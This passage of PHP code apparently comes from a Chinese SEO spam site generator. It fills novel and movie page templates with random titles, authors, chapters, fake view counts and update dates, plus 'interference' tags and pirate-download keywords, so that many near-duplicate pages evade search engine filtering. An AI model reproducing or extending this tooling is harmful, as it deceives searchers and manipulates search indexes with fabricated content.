		    $zuozhe_Str = trim($zuozhe_array[array_rand($zuozhe_array, 1)], PHP_EOL);
		    
    	    $booksImg_index .= '<div class="col-xs-4 book-coverlist"><div class="row"><div class="col-sm-5">';
			$booksImg_index .= '<a href="{#当前域名}/'.$fanmulu_read.'" class="thumbnail" style="background-image:url({#当前域名}/{#本地小说图片})" ';
			$booksImg_index .= 'target="_blank"></a></div>{#随机N个标签}<div class="col-sm-7 pl0"><div class="caption">';
			$booksImg_index .= '<h4 class="fs-16 text-muted"><a href="{#当前域名}/'.$fanmulu_read.'" title="'.$xiaoshuo_Str.'" target="_blank">'.$xiaoshuo_Str.'</a></h4>';
			$booksImg_index .= '<small class="fs-14 text-muted">'.$zuozhe_Str.'</small>{#随机N个标签}';
			$booksImg_index .= '<p class="fs-12 text-justify hidden-xs">{#句子}</p></div></div></div></div>';
		}
		$tpl=str_replace('{#首页推荐阅读}', $booksImg_index, $tpl);

        
		$xsTop_li = '';
		$top_xs_type = '{#新的干扰标签}';
		$xsTopCount = 0;
		foreach($xsTopArr as $key => $value) {
            $xsTopCount ++;
            
            //小说排行类型导航
            if($myCurrentUrl == $key){
                $xsTop_li .= '<li><a href="'.$key.'" class="onselect">'.$value.'</a></li>';
            }
            else{
                $xsTop_li .= '<li><a href="'.$key.'">'.$value.'</a></li>';
            }
            
            //小说类型排行2
            if($xsTopCount <= 3){
                $top_xs_type .= '<div class="col-md-4"><div class="panel panel-default"><div class="panel-heading">{#随机N个标签}';
    			$top_xs_type .= '<span class="glyphicon glyphicon-th-large" aria-hidden="true"></span> '.$value;
    			$top_xs_type .= '<a class="pull-right" href="'.$key.'">More+</a>';
    			$top_xs_type .= '</div><ul class="list-group list-top">{#随机N个标签}';
    			for($j=0; $j<=10; $j++){
    			    $xiaoshuo_Str = trim($xiaoshuo_array[array_rand($xiaoshuo_array, 1)], PHP_EOL);
    		        $zuozhe_Str = trim($zuozhe_array[array_rand($zuozhe_array, 1)], PHP_EOL);
    		    
    			    $top_xs_type .= '<a href="{#当前域名}/'.$fanmulu_txt.'" title="'.$xiaoshuo_Str.'" class="list-group-item" target="_blank">';
    			    $top_xs_type .= $xiaoshuo_Str.'<span class="pull-right fs-12">'.$zuozhe_Str.'</span>{#随机N个标签}</a>';
    			}
    			$top_xs_type .='</ul></div></div>';
            }
        }
        $tpl=str_replace('{#小说类型排行1}', '<div class="row">'.$top_xs_type.'</div>', $tpl);
        $tpl=str_replace('{#小说排行类型导航}', $xsTop_li, $tpl);
        
        
		//热门类型小说
		$booksImg_Str = '{#新的干扰标签}';
		for($j=1; $j<=6; $j++){
            $xiaoshuo_Str = trim($xiaoshuo_array[array_rand($xiaoshuo_array, 1)], PHP_EOL);
		    $zuozhe_Str = trim($zuozhe_array[array_rand($zuozhe_array, 1)], PHP_EOL);
		    
    	    $booksImg_Str .= '<div class="col-xs-4 book-coverlist"><div class="row"><div class="col-sm-5">{#随机N个标签}';
			$booksImg_Str .= '<a href="{#当前域名}/'.$fanmulu_read.'" class="thumbnail" style="background-image:url({#当前域名}/{#本地小说图片})"';
			$booksImg_Str .= ' target="_blank"></a></div><div class="col-sm-7 pl0"><div class="caption">';
			$booksImg_Str .= '<h4 class="fs-16 text-muted"><a href="{#当前域名}/'.$fanmulu_read.'" title="'.$xiaoshuo_Str.'" target="_blank">{#随机N个标签}';
			$booksImg_Str .= $xiaoshuo_Str.'</a></h4><small class="fs-14 text-muted">'.$zuozhe_Str.'</small>';
			$booksImg_Str .= '<p class="fs-12 text-justify hidden-xs">{#句子}</p></div></div></div></div>';
		}
		$tpl=str_replace('{#热门类型小说}', $booksImg_Str, $tpl);
		
		//类型小说列表
		$books_Str = '{#新的干扰标签}';
		for($j=1; $j<=30; $j++){
            $xiaoshuo_Str = trim($xiaoshuo_array[array_rand($xiaoshuo_array, 1)], PHP_EOL);
		    $zuozhe_Str = trim($zuozhe_array[array_rand($zuozhe_array, 1)], PHP_EOL);
		    $zhangjie_Str = trim($zhangjie_array[array_rand($zhangjie_array, 1)], PHP_EOL);
		    $currentXs_lx = $currentXsType == "" ? trim($xsTypeNameArr[array_rand($xsTypeNameArr, 1)], PHP_EOL) : $currentXsType;
		    
            $books_Str .= '<tr><td class="fs-12 hidden-xs" width="70">'.$currentXs_lx.'</td>';
            $books_Str .= '<td><a href="{#当前域名}/'.$fanmulu_read.'" >'.$xiaoshuo_Str.'</a></td>{#随机N个标签}';
			$books_Str .= '<td class="hidden-xs"><a class="text-muted"  title="'.$zhangjie_Str.'" href="{#当前域名}/'.$fanmulu_read.'">第'.rand(100,999).'章 '.$zhangjie_Str.'</a></td>';
			$books_Str .= '<td class="fs-12 text-muted">'.$zuozhe_Str.'</td>';
			$books_Str .= '<td class="fs-12 hidden-xs">'.rand(100,999).'万</td>';
			$books_Str .= '<td class="fs-12">{#随机N个标签}'.rand(1,29).'天前</td>';
			$books_Str .= '<td class="fs-12 hidden-xs">连载</td></tr>';
		}
		$tpl=str_replace('{#类型小说列表}', $books_Str, $tpl);
		$tpl=str_replace('{#全本小说类型}', $currentXsType==""?"全本":$currentXsType, $tpl);
		
		
		//全部章节目录
		$zhangjie_all_list = '{#新的干扰标签}';
		$zhangjie_all_count = rand(24, 66);
		for($j=1; $j<=$zhangjie_all_count; $j++){
		    $zhangjie_Str = trim($zhangjie_array[array_rand($zhangjie_array, 1)], PHP_EOL);
		    $zhangjie_all_list .= '<dd class="col-sm-4"><a href="{#当前域名}/'.$fanmulu_txt.'">第'.$j.'章 '.$zhangjie_Str.'</a>{#随机N个标签}</dd>';
		}
		$tpl=str_replace('{#全部章节目录}', $zhangjie_all_list, $tpl);
		
		//最新章节列表
		$zhangjie_new_list = '{#新的干扰标签}';
		$zhangjie_new_count = $zhangjie_all_count + rand(12, 24);
		for($j=$zhangjie_new_count; $j>$zhangjie_all_count; $j--){
		    $zhangjie_Str = trim($zhangjie_array[array_rand($zhangjie_array, 1)], PHP_EOL);
		    $zhangjie_new_list .= '<dd class="col-sm-4"><a href="{#当前域名}/'.$fanmulu_txt.'">第'.$j.'章 '.$zhangjie_Str.'</a>{#随机N个标签}</dd>';
		}
		$tpl=str_replace('{#最新章节列表}', $zhangjie_new_list, $tpl);
		
		//阅读相关
	    $xiangguan_arr=explode(',', '完结,全网下载,公主,无弹窗,云盘下载,最新,百度云,百度百科,粤语,完结小说,反派,好看,久久,好看吗,师傅,王爷,很好看,爽文,在线听,网络大电影,主人公,听书吧,百度云下载,一共多少个字,推荐,哪里可以看,评价怎么样,最新,txt下载,下拉式,看书吧,结局,在线阅读,云盘下载,下载,小说,类似小说,百度,手机阅读,大结局,在线阅读,同人小说,古代,微盘,结局,看书吧,评论,快穿,打包下载,全本,txt,男主角,男主,一键下载,女主角作品,完结了吗,txt下载,有声小说,代文,网游,经典,下载,虐心,mp3,全文免费阅读,女主,下拉式,评价如何,种子,女配');
	    
		$xiangguan_Str = '{#随机N个标签}';
		for($j=1; $j<=10; $j++){
		    $xg_key = trim($xiangguan_arr[array_rand($xiangguan_arr, 1)], PHP_EOL);
		    $xiangguan_Str .= '<a href="{#当前域名}/'.$fanmulu_txt.'.html" title="{#对应关键词}'.$xg_key.'">{#对应关键词}'.$xg_key.'</a>、';
		}
		$tpl=str_replace('{#相关阅读}', $xiangguan_Str, $tpl);
		
		$tpl=str_replace('{#对应小说类型}', trim($xsTypeNameArr[array_rand($xsTypeNameArr, 1)], PHP_EOL), $tpl);
		$tpl=str_replace('{#对应小说名}', trim($xiaoshuo_array[array_rand($xiaoshuo_array, 1)], PHP_EOL), $tpl);
		$tpl=str_replace('{#对应作者}', trim($zuozhe_array[array_rand($zuozhe_array, 1)], PHP_EOL), $tpl);
		
	} 
	//单页小说泛目录
	else if($WebSiteInfo['tpl'] == "temp_xs"){
	    
	    if($isPageIndex){ 
            $tpl = file_get_contents(ROOT.'/tpl/'.$WebSiteInfo['tpl'].'/index.html');
	    }
	    else{
	        $tpl = file_get_contents(ROOT.'/tpl/'.$WebSiteInfo['tpl'].'/'.rand(0,1).'/book.html');
	    }
	    
    	/////########################################小说部分操作########################################
    	$liList_zj = rand(50, 120);
    	$tpl = str_replace('{#章节数字}', $liList_zj + 1, $tpl);
    	
    	$bufen_count = rand(4,6) * 3;
    	$zhangjie_Str1 = '{#新的干扰标签}';
    	for($i = $liList_zj; $i > $liList_zj - $bufen_count; $i--){
    	    $zhangjie_Str1.='<li><a href="{#当前域名}/'.$WebSiteInfo['fanmulu'][0].'/{#sz12}.html">第'.$i.'章 {#章节}</a></li>
    	    {#随机N个标签}';
    	}
    	$tpl=str_replace('{#部分章节列表}', $zhangjie_Str1, $tpl);
    	
    	$tpl=randReplace('最新章节','data','zhangjie');
    	 
    	
    	$zhangjie_Str1 = '{#新的干扰标签}';
    	for($i = 1; $i <= $liList_zj - $bufen_count; $i++){
    	    $zhangjie_Str1.='<li><a href="{#当前域名}/'.$WebSiteInfo['fanmulu'][1].'/{#sz12}.html">第'.$i.'章 {#章节}</a></li>
    	    {#随机N个标签}';
    	}
    	$tpl=str_replace('{#全部章节列表}', $zhangjie_Str1, $tpl);
    	
    	$xiangguan_Str = '{#新的干扰标签}';
        $xiangguan_arr=explode(',', '完结,全网下载,公主,无弹窗,云盘下载,最新,百度云,百度百科,粤语,完结小说,反派,好看,久久,好看吗,师傅,王爷,很好看,爽文,在线听,网络大电影,主人公,听书吧,百度云下载,一共多少个字,推荐,哪里可以看,评价怎么样,最新,txt下载,下拉式,看书吧,结局,在线阅读,云盘下载,下载,小说,类似小说,百度,手机阅读,大结局,在线阅读,同人小说,古代,微盘,结局,看书吧,评论,快穿,打包下载,全本,txt,男主角,男主,一键下载,女主角作品,完结了吗,txt下载,有声小说,代文,网游,经典,下载,虐心,mp3,全文免费阅读,女主,下拉式,评价如何,种子,女配');
        
        for($i = 1; $i <= 10; $i++){
            $xg_key = array_rand($xiangguan_arr, 1);
    	    $xiangguan_Str.='<a href="{#当前域名}/'.$WebSiteInfo['fanmulu'][1].'/{#sz12}.html"><u>{#关键词1data}'.$xiangguan_arr[$xg_key].'</u></a>，';
    	}
    	$tpl=str_replace('{#相关词语}', $xiangguan_Str, $tpl);
    	/////########################################小说部分操作########################################
    	
    	
    	$booklist = '{#新的干扰标签}';
        $xiaoshuo_array = getDataArr("data", "xiaoshuo");
        $zuozhe_array = getDataArr("data", "zuozhe");
        $zhangjie_array = getDataArr("data", "zhangjie");
        
    	for($i = 1; $i <= 9; $i++){
            $xiaoshuo_Str = trim($xiaoshuo_array[array_rand($xiaoshuo_array, 1)], PHP_EOL);
    	    $zuozhe_Str = trim($zuozhe_array[array_rand($zuozhe_array, 1)], PHP_EOL);
    	    $zhangjie_Str = trim($zhangjie_array[array_rand($zhangjie_array, 1)], PHP_EOL);
    	    $booklist.='<li>
					<span>{#随机N个标签}
						<a href="{#当前域名}/{#泛目录1}/{#sz12}.html" title="'.$xiaoshuo_Str.'">
						<img src="{#当前域名}/{#本地小说图片}" alt="'.$xiaoshuo_Str.'"></a>
					</span>
                    <h3><a href="{#当前域名}/{#泛目录1}/{#sz12}.html">'.$xiaoshuo_Str.'</a></h3>
                    <p class="author">(著) '.$zuozhe_Str.'</p>
                    <p class="intro">{#句子}{#句子}</p>
                </li>
                {#随机N个标签}
                ';
    	}
    	$tpl=str_replace('{#booklist}', $booklist, $tpl);
    	
    	$dyzuozhe = $zuozhe_Str = trim($zuozhe_array[array_rand($zuozhe_array, 1)], PHP_EOL);
    	$tpl=str_replace('{#对应作者}', $dyzuozhe, $tpl);
    	
    	
    	$dianying_ji = '{#新的干扰标签}';
    	for($i = 1; $i <= rand(40,80); $i++){
    	    $dianying_ji.='<li {#随机属性} class="{#zf6}"><a {#随机属性} href="{#当前域名}/{#泛目录2}/{#关键词'.(200+$i).'URL}"> 第'.($i + 1).'集</a></li>
    	    {#随机N个标签}';
    	}
    	$tpl=str_replace('{#影片集数}', $dianying_ji, $tpl);
	}
	//单页小说泛目录
	else if($WebSiteInfo['tpl'] == "temp_xs_13"){
	    
	    if($isPageIndex){
            $tpl = file_get_contents(ROOT.'/tpl/'.$WebSiteInfo['tpl'].'/index.html');
	    }
	    else{
	        $get_tpl = array('/list/list.html','/chapter/chapter.html','/article/article.html');
	        $tpl = file_get_contents(ROOT.'/tpl/'.$WebSiteInfo['tpl'].$get_tpl[array_rand($get_tpl,1)]);
	    }
	    $tpl = str_replace('class="', ' {#随机属性} class="', $tpl);
	}
	// 新电影模板 2023-05-19
	else if($WebSiteInfo['tpl'] == "temp120"){
	    include ROOT.'/include/temp_php/temp120.php';
	    	    
	    if($isPageIndex){ 
            $tpl = file_get_contents(ROOT.'/tpl/'.$WebSiteInfo['tpl'].'/index.html');
	    }
	    else{
	        $get_tpl = array('/voddetail/82887.html', '/vodplay/126441-1-1.html');
	        $tpl = file_get_contents(ROOT.'/tpl/'.$WebSiteInfo['tpl'].$get_tpl[array_rand($get_tpl,1)]);
	    }
	   
        if($isPageIndex){
    	    $tpl = str_replace('{#flickity_slider}', tpl_120_index('flickity_slider'), $tpl);
    	    $tpl = str_replace('{#stui_pannel_list}', tpl_120_index('stui_pannel_list'), $tpl);
    	    $tpl = str_replace('{#stui_pannel_top}', tpl_120_index('stui_pannel_top'), $tpl);
        }
        else{
            if(substr_count($tpl, '{#stui_content_playlist}'))
        	    $tpl = str_replace('{#stui_content_playlist}', tpl_120_detail('stui_content_playlist'), $tpl);
        	if(substr_count($tpl, '{#stui_vodlist_bd}'))
        	    $tpl = str_replace('{#stui_vodlist_bd}', tpl_120_detail('stui_vodlist_bd'), $tpl);
        	if(substr_count($tpl, '{#stui_vodlist_text}'))
        	    $tpl = str_replace('{#stui_vodlist_text}', tpl_120_detail('stui_vodlist_text'), $tpl);
        	if(substr_count($tpl, '{#stui_pannel_hottop}'))
        	    $tpl = str_replace('{#stui_pannel_hottop}', tpl_120_detail('stui_pannel_hottop'), $tpl);
        }
        
        $yunbom_name = array('优酷','爱奇艺','百度','腾讯','搜狐','PP','凤凰','芒果','土豆','哔哩哔哩','暴风影音');
        $tpl = str_replace('{#yunbom_name}', $yunbom_name[array_rand($yunbom_name,1)], $tpl);
        
        $tpl = str_replace('class="', 'class="{#zf5} ', $tpl);
        $tpl = str_replace(' class="', '{#随机属性}class="', $tpl);
        
	}
	// 新电影模板 2023-05-20
	else if($WebSiteInfo['tpl'] == "temp130"){
	    include ROOT.'/include/temp_php/temp130.php';
	    if($isPageIndex){ 
            $tpl = file_get_contents(ROOT.'/tpl/'.$WebSiteInfo['tpl'].'/index.html');
            
            $tpl = str_replace('{#flickity_slider}', tpl_130_index('flickity_slider'), $tpl);
    	    $tpl = str_replace('{#stui_pannel_list}', tpl_130_index('stui_pannel_list'), $tpl);
	    }
	    else{
	        $get_tpl = array('/topshow/12_82977.html', '/topplay/12_82977_1_1.html');
	        $tpl = file_get_contents(ROOT.'/tpl/'.$WebSiteInfo['tpl'].$get_tpl[array_rand($get_tpl,1)]);

            if(substr_count($tpl, '{#stui_content_playlist}'))
        	    $tpl = str_replace('{#stui_content_playlist}', tpl_130_detail('stui_content_playlist'), $tpl);
        	if(substr_count($tpl, '{#stui_vodlist_bd}'))
        	    $tpl = str_replace('{#stui_vodlist_bd}', tpl_130_detail('stui_vodlist_bd'), $tpl);
        	if(substr_count($tpl, '{#stui_pannel_hottop}'))
        	    $tpl = str_replace('{#stui_pannel_hottop}', tpl_130_detail('stui_pannel_hottop'), $tpl);
        }
        
        $yunbom_name = array('优酷','爱奇艺','百度','腾讯','搜狐','PP','凤凰','芒果','土豆','哔哩哔哩','暴风影音');
        $tpl = str_replace('{#yunbom_name}', $yunbom_name[array_rand($yunbom_name,1)], $tpl);
        
        $tpl = str_replace('class="', 'class="{#zf5} ', $tpl);
        $tpl = str_replace(' class="', '{#随机属性}class="', $tpl);
        
	}
	
	else if($WebSiteInfo['tpl'] == "temp_xs_20"){
	    include ROOT.'/include/temp_php/temp_xs_20.php'; 
	    if($isPageIndex){ 
            $tpl = file_get_contents(ROOT.'/tpl/'.$WebSiteInfo['tpl'].'/index.htm'); 
            
            $tpl = str_replace('{#xs_fengtui_data}', xs20_index('xs_fengtui_data'), $tpl);
    	    $tpl = str_replace('{#list_tbtj_data}', xs20_index('list_tbtj_data'), $tpl);
    	    $tpl = str_replace('{#xs_lunbo_data}', xs20_index('xs_lunbo_data'), $tpl);
    	    $tpl = str_replace('{#xs_bangdan_data}', xs20_index('xs_bangdan_data'), $tpl);
    	    $tpl = str_replace('{#module_bd_data}', xs20_index('module_bd_data'), $tpl);
    	    $tpl = str_replace('{#module_data}', xs20_index('module_data'), $tpl);
	    }
	    else{
	        $get_tpl = array('/list.html', '/article.html');
	        $tpl = file_get_contents(ROOT.'/tpl/'.$WebSiteInfo['tpl'].$get_tpl[array_rand($get_tpl,1)]);
            
            if(substr_count($tpl, '{#stui_content_playlist}'))
        	    $tpl = str_replace('{#stui_content_playlist}', tpl_130_detail('stui_content_playlist'), $tpl);
        	if(substr_count($tpl, '{#stui_vodlist_bd}'))
        	    $tpl = str_replace('{#stui_vodlist_bd}', tpl_130_detail('stui_vodlist_bd'), $tpl);
        	if(substr_count($tpl, '{#stui_pannel_hottop}'))
        	    $tpl = str_replace('{#stui_pannel_hottop}', tpl_130_detail('stui_pannel_hottop'), $tpl);
        }
        
        $yunbom_name = array('优酷','爱奇艺','百度','腾讯','搜狐','PP','凤凰','芒果','土豆','哔哩哔哩','暴风影音');
        $tpl = str_replace('{#yunbom_name}', $yunbom_name[array_rand($yunbom_name,1)], $tpl);
        
        // $tpl = str_replace('class="', 'class="{#zf5} ', $tpl);
        // $tpl = str_replace(' class="', '{#随机属性}class="', $tpl);
        
	}
	
	else if(in_array($WebSiteInfo['tpl'], $dy_temp_v20)){
	    
        include ROOT.'/include/temp_php/temp_v211.php'; 
        if($isPageIndex){ 
            $tpl = file_get_contents(ROOT.'/tpl/'.$WebSiteInfo['tpl'].'/index.html');
        }
        else if(substr_count($WebSiteInfo['fanmulu'][1], $url_real_arr[0])){
            $tpl = file_get_contents(ROOT.'/tpl/'.$WebSiteInfo['tpl'].'/detail.html');
        }
        else{
            $tpl = file_get_contents(ROOT.'/tpl/'.$WebSiteInfo['tpl'].'/play.html');
        }
        
        temp_v211_detail($WebSiteInfo['tpl'], $WebSiteInfo);
        
        $tpl = str_replace('class="', '{#随机属性}class="', $tpl);
        $tpl = str_replace('/voddetail/', '/{#泛目录1}/', $tpl);
        $tpl = str_replace('/vodplay/', '/{#泛目录2}/', $tpl);
        
        $yunbom_name = array('优酷','爱奇艺','百度','腾讯','搜狐','PP','凤凰','芒果','土豆','哔哩哔哩','暴风影音');
        $tpl = str_replace('{#yunbom_name}', $yunbom_name[array_rand($yunbom_name,1)], $tpl);
	}
	//电影模板
	else{
	    //模版目录
	    $temp_folder = "tpl_test3";
	    //电影模板颜色
        $temp_style = "mytheme-color"; 
        if(in_array($WebSiteInfo['tpl'], $dy_temp_1)){
            $temp_folder = 'tpl_test1';
            if($WebSiteInfo['tpl'] == "temp11"){
                $temp_style = "mytheme-color1";
            }
            else if($WebSiteInfo['tpl'] == "temp12"){
                $temp_style = "mytheme-color2";
            }
            else if($WebSiteInfo['tpl'] == "temp13"){
                $temp_style = "mytheme-color3";
            } 
        }
        else if(in_array($WebSiteInfo['tpl'], $dy_temp_2)){
            $temp_folder = 'tpl_test2';
            if($WebSiteInfo['tpl'] == "temp21"){
                $temp_style = "mytheme-color1";
            }
            else if($WebSiteInfo['tpl'] == "temp22"){
                $temp_style = "mytheme-color2";
            }
            else if($WebSiteInfo['tpl'] == "temp23"){
                $temp_style = "mytheme-color3";
            }
        }
        else if(in_array($WebSiteInfo['tpl'], $dy_temp_3)){
            $temp_folder = 'tpl_test3';
            if($WebSiteInfo['tpl'] == "temp31"){
                $temp_style = "mytheme-color1";
            }
            else if($WebSiteInfo['tpl'] == "temp32"){
                $temp_style = "mytheme-color2";
            }
            else if($WebSiteInfo['tpl'] == "temp33"){
                $temp_style = "mytheme-color3";
            }
        }
        else if(in_array($WebSiteInfo['tpl'], $dy_temp_5)){
            $temp_folder = 'tpl_test5';
            if($WebSiteInfo['tpl'] == "temp70"){
                $temp_style = "mytheme-color1";
            }
            else if($WebSiteInfo['tpl'] == "temp32"){
                $temp_style = "mytheme-color2";
            }
            else if($WebSiteInfo['tpl'] == "temp33"){
                $temp_style = "mytheme-color3";
            }
        }
        
        
	    if($isPageIndex){
	        $tpl = file_get_contents('../tpl/'.$temp_folder.'/index.html');
	    }
	    else{
	        $tempfile = '../tpl/'.$temp_folder.'/temp'.rand(0,3).'.html';
	        $tpl = file_get_contents($tempfile);
	    }
	    $tpl = str_replace('{#电影模板颜色}', $temp_style, $tpl);
	    
	    
	    
        if(in_array($WebSiteInfo['tpl'], $dy_temp_1)){
	        include ROOT.'/include/temp_php/temp10.php';
            if($isPageIndex){
        	    $tpl = str_replace('{#top_list_data}', tpl_10_index('top_list_data'), $tpl);
        	    $tpl = str_replace('{#update_list_data}', tpl_10_index('update_list_data'), $tpl);
        	    $tpl = str_replace('{#type_list_data}', tpl_10_index('type_list_data'), $tpl);
            }
            else{
                if(substr_count($tpl, '{#alltype_list_data}'))
            	    $tpl = str_replace('{#alltype_list_data}', tpl_10_list('alltype_list_data'), $tpl);
            	if(substr_count($tpl, '{#play_list_data}'))
            	    $tpl = str_replace('{#play_list_data}', tpl_10_list('play_list_data'), $tpl);
            	if(substr_count($tpl, '{#stui_vodlist_bd_clearfix}'))
            	    $tpl = str_replace('{#stui_vodlist_bd_clearfix}', tpl_10_list('stui_vodlist_bd_clearfix'), $tpl);
            	if(substr_count($tpl, '{#carousel_right_clearfix}'))
            	    $tpl = str_replace('{#carousel_right_clearfix}', tpl_10_list('carousel_right_clearfix'), $tpl);
            	if(substr_count($tpl, '{#stui_vodlist_clearfix}'))
            	    $tpl = str_replace('{#stui_vodlist_clearfix}', tpl_10_list('stui_vodlist_clearfix'), $tpl);
            	if(substr_count($tpl, '{#stui_pannel_clearfix}'))
            	    $tpl = str_replace('{#stui_pannel_clearfix}', tpl_10_list('stui_pannel_clearfix'), $tpl);
            }
        }
        else if(in_array($WebSiteInfo['tpl'], $dy_temp_2)){
	        include ROOT.'/include/temp_php/temp20.php';
            if($isPageIndex){
                $tpl = str_replace('{#home_slide_data}', tpl_20_index('home_slide_data'), $tpl); 
                $tpl = str_replace('{#fljs_list_data}', tpl_20_index('fljs_list_data'), $tpl); 
                $tpl = str_replace('{#hot_index_list_data}', tpl_20_index('hot_index_list_data'), $tpl); 
                $tpl = str_replace('{#tuijian_list_data2}', tpl_20_index('tuijian_list_data2'), $tpl); 
                $tpl = str_replace('{#zbd_list_data2}', tpl_20_index('zbd_list_data2'), $tpl); 
                $tpl = str_replace('{#zixun_index_list_data}', tpl_20_index('zixun_index_list_data'), $tpl); 
            }
            else{
                if(substr_count($tpl, '{#flickity_clearfix}'))
                    $tpl = str_replace('{#flickity_clearfix}', tpl_20_list('flickity_clearfix'), $tpl); 
                if(substr_count($tpl, '{#alltype_list_data}'))
                    $tpl = str_replace('{#alltype_list_data}', tpl_20_list('alltype_list_data'), $tpl); 
                if(substr_count($tpl, '{#list_list_data}'))
                    $tpl = str_replace('{#list_list_data}', tpl_20_list('list_list_data'), $tpl); 
                if(substr_count($tpl, '{#fenye_list_data}'))
                    $tpl = str_replace('{#fenye_list_data}', tpl_20_list('fenye_list_data'), $tpl); 
                if(substr_count($tpl, '{#play_list_data2}'))
                    $tpl = str_replace('{#play_list_data2}', tpl_20_list('play_list_data2'), $tpl); 
                if(substr_count($tpl, '{#play_list_data1}'))
                    $tpl = str_replace('{#play_list_data1}', tpl_20_list('play_list_data1'), $tpl); 
                if(substr_count($tpl, '{#like_list_data2}'))
                    $tpl = str_replace('{#like_list_data2}', tpl_20_list('like_list_data2'), $tpl); 
                if(substr_count($tpl, '{#all_look_list_data2}'))
                    $tpl = str_replace('{#all_look_list_data2}', tpl_20_list('all_look_list_data2'), $tpl); 
                if(substr_count($tpl, '{#rebo_list_data}'))
                    $tpl = str_replace('{#rebo_list_data}', tpl_20_list('rebo_list_data'), $tpl); 
                if(substr_count($tpl, '{#zixun_list_data2}'))
                    $tpl = str_replace('{#zixun_list_data2}', tpl_20_list('zixun_list_data2'), $tpl); 
                if(substr_count($tpl, '{#someyuijian_list_data}'))
                    $tpl = str_replace('{#someyuijian_list_data}', tpl_20_list('someyuijian_list_data'), $tpl); 
            }
        }
    	else if(in_array($WebSiteInfo['tpl'], $dy_temp_3)){
	        include ROOT.'/include/temp_php/temp30.php';
            if($isPageIndex){
            	$tpl = str_replace('{#flickity_active_clearfix}', tpl_30_index('flickity_active_clearfix'), $tpl);
            	$tpl = str_replace('{#dapian_list_data}', tpl_30_index('dapian_list_data'), $tpl);
            	$tpl = str_replace('{#tuijian_list_data}', tpl_30_index('tuijian_list_data'), $tpl);
            	$tpl = str_replace('{#liebiao_list_data}', tpl_30_index('liebiao_list_data'), $tpl);
            	$tpl = str_replace('{#zbd_list_data}', tpl_30_index('zbd_list_data'), $tpl);
            }
            else{
                if(substr_count($tpl, '{#nav_list_clearfix}'))
            	    $tpl = str_replace('{#nav_list_clearfix}', tpl_30_list('nav_list_clearfix'), $tpl); 
            	if(substr_count($tpl, '{#play_list_data}'))
            	    $tpl = str_replace('{#play_list_data}', tpl_30_list('play_list_data'), $tpl);
            	if(substr_count($tpl, '{#play_list_data1}'))
            	    $tpl = str_replace('{#play_list_data1}', tpl_30_list('play_list_data1'), $tpl);
            	if(substr_count($tpl, '{#like_list_data}'))
            	    $tpl = str_replace('{#like_list_data}', tpl_30_list('like_list_data'), $tpl);
            	if(substr_count($tpl, '{#all_look_list_data}'))
            	    $tpl = str_replace('{#all_look_list_data}', tpl_30_list('all_look_list_data'), $tpl);
            	if(substr_count($tpl, '{#hot_list_data}'))
            	    $tpl = str_replace('{#hot_list_data}', tpl_30_list('hot_list_data'), $tpl);
            	if(substr_count($tpl, '{#zixun_list_data}'))
            	    $tpl = str_replace('{#zixun_list_data}', tpl_30_list('zixun_list_data'), $tpl);
                if(substr_count($tpl, '{#alltype_list_data}'))
                    $tpl = str_replace('{#alltype_list_data}', tpl_30_list('alltype_list_data'), $tpl); 
                if(substr_count($tpl, '{#list_list_data}'))
                    $tpl = str_replace('{#list_list_data}', tpl_30_list('list_list_data'), $tpl); 
                if(substr_count($tpl, '{#fenye_list_data}'))
                    $tpl = str_replace('{#fenye_list_data}', tpl_30_list('fenye_list_data'), $tpl); 
            }
        }
        else if(in_array($WebSiteInfo['tpl'], $dy_temp_5)){
	        include ROOT.'/include/temp_php/temp70.php';
            if($isPageIndex){
        	    $tpl = str_replace('{#type_list_data}', tpl_70_index('type_list_data'), $tpl);
            }
            else{
                if(substr_count($tpl, '{#alltype_list_data}'))
            	    $tpl = str_replace('{#alltype_list_data}', tpl_70_list('alltype_list_data'), $tpl);
            	if(substr_count($tpl, '{#stui_vodlist_clearfix}'))
            	    $tpl = str_replace('{#stui_vodlist_clearfix}', tpl_70_list('stui_vodlist_clearfix'), $tpl);
            	if(substr_count($tpl, '{#stui_pannel_clearfix}'))
            	    $tpl = str_replace('{#stui_pannel_clearfix}', tpl_70_list('stui_pannel_clearfix'), $tpl);
            	if(substr_count($tpl, '{#like_list_data}'))
            	    $tpl = str_replace('{#like_list_data}', tpl_70_list('like_list_data'), $tpl);
            	if(substr_count($tpl, '{#play_list_data}'))
            	    $tpl = str_replace('{#play_list_data}', tpl_70_list('play_list_data'), $tpl);
            	if(substr_count($tpl, '{#play_list_data1}'))
            	    $tpl = str_replace('{#play_list_data1}', tpl_70_list('play_list_data1'), $tpl);
            }
        }
        
        
    	$dianying_ji = '{#新的干扰标签}';
    	for($i = 1; $i <= rand(40,80); $i++){
    	    $dianying_ji.='<li {#随机属性} class="{#zf6}"><a {#随机属性} href="{#当前域名}/{#泛目录2}/{#关键词'.(200+$i).'URL}"> 第'.($i + 1).'集</a></li>
    	    {#随机N个标签}';
    	}
    	$tpl=str_replace('{#影片集数}', $dianying_ji, $tpl);
	}
	
    
    
    //替换当前域名
	$tpl = str_replace('{#主域名}', $topDomain, $tpl);
    //替换当前域名
	$tpl = str_replace('{#当前域名}', $Protocol.$host_name, $tpl);
	//替换 请求协议
	$tpl = str_replace('{#请求协议}', $Protocol, $tpl);
	//替换域名
	$tpl = str_replace('{#域名}', $host_name, $tpl); 
	//当前URL
	$tpl = str_replace('{#当前url}', $currUrl, $tpl); 
	
	$tpl = str_replace('{#网站名}', $WebSiteInfo['name'], $tpl);
	$tpl = str_replace('{#本站标题}', $WebSiteInfo['title'], $tpl);
	$tpl = str_replace('{#本站关键词}', $WebSiteInfo['keywords'], $tpl);
	$tpl = str_replace('{#本站描述}', $WebSiteInfo['description'], $tpl);
	
	//备案号
	if($WebSiteInfo['beian_code'] !== false && $WebSiteInfo['beian_code'] !== ""){
	    $tpl = str_replace('{#备案号}', '备案号：<a href="http://beian.miit.gov.cn/" rel="nofollow" target="_blank">'.$WebSiteInfo['beian_code'].'</a>', $tpl);
	}
	else{
	    $tpl = str_replace('{#备案号}', '', $tpl);
	}
	
	
	//栏目目录  栏目目录名
	for($i = 0; $i < count($WebSiteInfo['lanmu']); $i++){
    	//栏目目录
    	$lanmu = $WebSiteInfo['lanmu'][$i];
    	$tpl = str_replace('{#栏目目录'.$i.'}', $lanmu, $tpl); 
    	//栏目目录名
	    $langmuming = $WebSiteInfo['lanmuming'][$i];
    	if($langmuming == ""){
    	    $langmuming = "{#关键词".$i."data}"; 
    	}
	    $tpl = str_replace('{#栏目目录名'.$i.'}', $langmuming, $tpl);
	}
	
	
	//泛目录
	for($i = 0; $i < count($WebSiteInfo['fanmulu']); $i++){
